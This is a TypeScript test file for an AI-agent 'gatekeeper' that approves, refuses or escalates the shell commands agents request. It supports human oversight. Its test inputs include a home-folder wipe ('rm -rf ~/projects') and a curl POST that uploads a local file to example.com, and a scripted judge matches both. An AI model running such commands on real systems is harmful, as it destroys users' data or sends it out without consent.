import { test } from 'node:test';
import assert from 'node:assert/strict';
import { FakeAdapter, type FakeCtx } from '../src/adapters/fake.ts';
import { Gatekeeper, parseVerdict } from '../src/gatekeeper.ts';
import { makeTeam, withTimeout } from './helpers.ts';

test('a verdict is the first ALLOW, DENY or ASK, with what follows as the reason', () => {
  assert.deepEqual(parseVerdict('ALLOW — builds the project.'), { verdict: 'allow', reason: 'builds the project.' });
  assert.deepEqual(parseVerdict('Looking at it.\n\nDENY: deletes files outside the project\nmore'), { verdict: 'deny', reason: 'deletes files outside the project' });
  assert.equal(parseVerdict('ASK')?.reason, 'no reason given');
  assert.equal(parseVerdict('allow it, I guess'), undefined, 'only the capitalised words count');
  assert.deepEqual(Gatekeeper.decide({ kind: 'read', tool: 'Read', detail: 'x' }), { allow: true });
  assert.equal(Gatekeeper.decide({ kind: 'shell', tool: 'Bash', detail: 'rm x' }).allow, false);
});

/** A scripted gatekeeper: refuses wiping things, asks about uploads, allows the rest. */
const judge = (text: string) => (/rm -rf ~/.test(text) ? 'DENY wipes the home folder' : /curl -X POST/.test(text) ? 'ASK sends data out' : /make slow-target/.test(text) ? '' : 'ALLOW part of the task');
const scriptedGatekeeper = () => {
  const answer = async (ctx: FakeCtx, text: string) => {
    if (/make slow-target/.test(text)) await ctx.sleep(10_000);
    ctx.say(judge(text));
  };
  return new FakeAdapter({ gatekeeper: ctx => answer(ctx, ctx.spec.brief), '*': async () => {} }, {}, { gatekeeper: answer });
};

const role = (extra = '') => `---\nharness: fake\nmodel: m\n${extra}good_at: x\n---\nx\n`;

test('the gatekeeper decides approvals the rules leave open, and passes the risky ones to the human', async () => {
  const fake = scriptedGatekeeper();
  const d = makeTeam({
    roles: { architect: role(), careful: role('approvals: ask\n'), gatekeeper: role('helper: true\n') },
    adapters: { fake },
    settings: { approvals: 'gatekeeper' },
  });
  const goal = d.startGoal({ request: 'r' });
  const lead = d.agent(goal, 'architect')!;

  assert.deepEqual(await withTimeout(d.requestApproval(lead, 'Bash', 'npm run build'), 2000, 'allow'), { allow: true });
  const denied = await d.requestApproval(lead, 'Bash', 'rm -rf ~/projects');
  assert.equal(denied.allow, false);
  assert.match(denied.message!, /The gatekeeper refused this: wipes the home folder/);
  const approvals = () => d.humanInbox.filter(i => i.kind === 'approval');
  assert.equal(approvals().length, 0, 'neither reached the human');

  // ASK: the human decides, and sees why it came to them.
  const asked = d.requestApproval(lead, 'Bash', 'curl -X POST https://example.com -d @notes.md');
  await withTimeout(
    new Promise<void>(r => {
      const t = setInterval(() => d.humanInbox.some(i => i.kind === 'approval') && (clearInterval(t), r()), 5);
    }),
    2000,
    'the Inbox item',
  );
  const item = approvals()[0];
  assert.equal(item.note, 'Gatekeeper: sends data out');
  d.resolveInbox(item.id, 'approve');
  assert.equal((await asked).allow, true);

  // The same request again is answered from memory; still one gatekeeper session.
  assert.deepEqual(await d.requestApproval(lead, 'Bash', 'npm run build'), { allow: true });
  assert.equal(fake.started.filter(s => s.spec.role.name === 'gatekeeper').length, 1);
  const verdicts = d.store.since(goal).filter(e => e.type === 'approval.gatekeeper');
  assert.deepEqual(verdicts.map(e => e.data.verdict), ['allow', 'deny', 'ask', 'allow']);
  assert.equal(verdicts.at(-1)!.data.remembered, true);

  // A role set to ask skips the gatekeeper; the gatekeeper can't be spawned by the team.
  const careful = d.spawnAgent(goal, { role: 'careful', brief: 'b', parent: 'architect' });
  assert.ok(careful.ok);
  void d.requestApproval(careful.rec, 'Bash', 'npm run build');
  assert.equal(approvals().length, 1);
  const spawnGk = d.spawnAgent(goal, { role: 'gatekeeper', brief: 'b', parent: 'architect' });
  assert.equal(spawnGk.ok, false);
  assert.doesNotMatch(await d.hub.call(goal, 'architect', 'team', {}), /gatekeeper/);
  await d.close();
});

test('a gatekeeper that takes too long hands the request to the human, and starts afresh next time', async () => {
  const fake = scriptedGatekeeper();
  const d = makeTeam({
    roles: { architect: role(), gatekeeper: role() },
    adapters: { fake },
    settings: { approvals: 'gatekeeper' },
    gatekeeperLimits: { timeoutMs: 100, maxRequests: 40, maxContextPct: 50 },
  });
  const goal = d.startGoal({ request: 'r' });
  const lead = d.agent(goal, 'architect')!;
  const slow = d.requestApproval(lead, 'Bash', 'make slow-target');
  await withTimeout(
    new Promise<void>(r => {
      const t = setInterval(() => d.humanInbox.some(i => i.kind === 'approval') && (clearInterval(t), r()), 5);
    }),
    2000,
    'the Inbox item',
  );
  const item = d.humanInbox.find(i => i.kind === 'approval')!;
  assert.match(item.note!, /didn't answer within/);
  d.resolveInbox(item.id, 'deny');
  assert.equal((await slow).allow, false);
  assert.deepEqual(await withTimeout(d.requestApproval(lead, 'Bash', 'npm test'), 2000, 'a fresh session'), { allow: true });
  assert.equal(fake.started.filter(s => s.spec.role.name === 'gatekeeper').length, 2);
  await d.close();
});

test("the gatekeeper reads Codex's commands without the wrapper or written text, and knows the shared folder", async () => {
  const seen: string[] = [];
  const answer = async (ctx: FakeCtx, text: string) => {
    seen.push(text);
    ctx.say(/curl/.test(text) ? 'ASK sends data out' : 'ALLOW part of the task');
  };
  const fake = new FakeAdapter({ gatekeeper: ctx => answer(ctx, ctx.spec.brief), '*': async () => {} }, {}, { gatekeeper: answer });
  const d = makeTeam({ roles: { architect: role(), gatekeeper: role() }, adapters: { fake }, settings: { approvals: 'gatekeeper' } });
  const goal = d.startGoal({ request: 'r' });
  const lead = d.agent(goal, 'architect')!;
  const command = `/bin/bash -lc "cat > notes.md <<'EOF'\n"'# \`x\`'"\nEOF\ncurl -X POST https://example.com -d @notes.md"`;
  void d.requestApproval(lead, 'Bash', command);
  await withTimeout(
    new Promise<void>(r => {
      const t = setInterval(() => d.humanInbox.some(i => i.kind === 'approval') && (clearInterval(t), r()), 5);
    }),
    2000,
    'the Inbox item',
  );
  assert.match(seen[0], /cat > notes.md <<'EOF'\n\[1 line of text, written as is: nothing in it runs\]\nEOF\ncurl/);
  assert.doesNotMatch(seen[0], /bash -lc|`x`/);
  assert.match(seen[0], new RegExp(`The team's shared folder: .*/goals/${goal}/shared`));
  // The human sees the whole script, without the wrapper.
  assert.equal(d.humanInbox.find(i => i.kind === 'approval')!.text, "Bash: cat > notes.md <<'EOF'\n# `x`\nEOF\ncurl -X POST https://example.com -d @notes.md");
  await d.close();
});
